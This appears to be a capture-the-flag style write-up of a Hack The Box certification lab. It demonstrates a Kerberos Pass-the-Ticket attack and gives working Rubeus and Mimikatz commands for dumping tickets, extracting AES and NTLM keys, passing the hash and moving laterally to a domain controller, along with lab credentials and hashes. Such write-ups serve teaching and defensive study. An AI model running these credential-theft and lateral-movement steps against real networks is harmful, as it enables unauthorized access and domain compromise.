<img width="969" height="608" alt="PtT" src="https://github.com/user-attachments/assets/04dd4344-3ee8-44c3-b9fd-9a6e8cc7fc61" />

```markdown
# Pass the Ticket (PtT) Attack | HTB Password Attacks
**Category:** HTB CPTS Certification Lab  
**Date:** January 2026

> ### 🛡️ Ethical Hacking Disclaimer
> *This write-up is for educational purposes only. All activities were performed in a controlled, private lab environment provided by Hack The Box (HTB). Unauthorized access to computer systems is illegal and unethical.*

---


## 1. Introduction
Pass the Ticket (PtT) is a post-exploitation technique where an attacker uses a stolen Kerberos ticket (TGT or TGS) to authenticate to a remote system without knowing the user’s plaintext password.

In this lab, we started with administrative access to a compromised member server (**MS01**). Our objective was to:
1. Enumerate cached Kerberos tickets.
2. Extract cryptographic key material (AES/NTLM) for a target user (**john**).
3. Move laterally to the Domain Controller (**DC01**) to retrieve sensitive flags.

---

## 2. Execution Phase

### Step 1: Access and Enumeration
We began by establishing a remote desktop connection to the target host `10.129.204.23` using the provided credentials.

```bash
xfreerdp3 /v:'10.129.204.23' /u:'Administrator' /p:'AnotherC0mpl3xP4$$'

```

Upon successful login, we launched a Command Prompt as Administrator and navigated to the tools directory (`C:\tools`). We utilized **Rubeus** to assess the current Kerberos state.
<img width="800" height="571" alt="1_uzCetrw9A2eEcOp4obAArA" src="https://github.com/user-attachments/assets/a86f54bb-cb3e-45e0-9a7d-963987bb1928" />
<img width="583" height="162" alt="1_9iWTdpB0ayCY5E_iijVTGg" src="https://github.com/user-attachments/assets/297457fc-c916-428a-baeb-f1e098903a29" />


```cmd
Rubeus.exe dump /nowrap

```


<img width="800" height="372" alt="1_uLvt4x23BKD8QSBUmeFBlg" src="https://github.com/user-attachments/assets/62d49776-4352-4b2e-89b6-ae0c39ace861" />

**Findings:**

* **Computer Accounts:** Tickets ending in `$` (e.g., `MS01$@inlanefreight.htb`).
* **User Accounts:** We identified `john`, `julios`, and `david`.
* **Target:** We focused on `john@inlanefreight.htb`.

---

### Step 2: Harvesting Credentials & Accessing File Shares

With the target user identified, we used **Mimikatz** to extract the encryption keys.

```cmd
mimikatz.exe privilege::debug sekurlsa::ekeys

```
<img width="800" height="445" alt="1_HpquTzZYy4s8RsUtvIvn-g" src="https://github.com/user-attachments/assets/f8d369f3-1a2b-4f4c-b0bd-d859fbed2ee4" />



We extracted the **AES256** and **NTLM (RC4)** keys for `john`. We then performed a **Pass-the-Hash** attack to spawn a new command prompt running under john's context.

```cmd
sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2

```
<img width="800" height="312" alt="1_uAgUQPKN6xTjl8i5gsHoZg" src="https://github.com/user-attachments/assets/bf97749e-d8e7-4952-9553-e843a5263c07" />


From this new session, we verified access to the Domain Controller’s file share:

```cmd
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt

```
<img width="706" height="297" alt="1_ii4bpFyIWQcROVqqZifpOg" src="https://github.com/user-attachments/assets/a1265a3d-a1d2-43d5-b5e6-1f6959621838" />


---

### Step 3: Lateral Movement via PowerShell Remoting

To gain **Remote Code Execution (RCE)** on the Domain Controller, we injected a valid TGT into our session using **Rubeus**.

**Command Breakdown:**

* `createnetonly`: Spawns a discrete process for the new credentials.
* `asktgt /ptt`: Requests and imports the ticket immediately.

```cmd
# Spawn a discrete process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# In the new window, import the TGT using the AES256 key
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

```
<img width="800" height="227" alt="1_Np6f1kagb1temFRrkOXnaQ" src="https://github.com/user-attachments/assets/6258d1e2-5beb-4b81-95c5-cfb422f9ef26" />


Finally, we connected via PowerShell Remoting:

```powershell
Enter-PSSession -ComputerName DC01

```
<img width="686" height="503" alt="1_jKseZ2Dx6yMQI-YM68TBqw" src="https://github.com/user-attachments/assets/e254ee06-a1f5-434c-87a2-5ac023af727e" />



---

## 3. Conclusion

This lab demonstrated how compromising a single endpoint allows an attacker to harvest material from memory and pivot deeper into a network. Using **Mimikatz** for Overpass-the-Hash and **Rubeus** for Pass-the-Ticket highlights why protecting privileged sessions is critical.


---

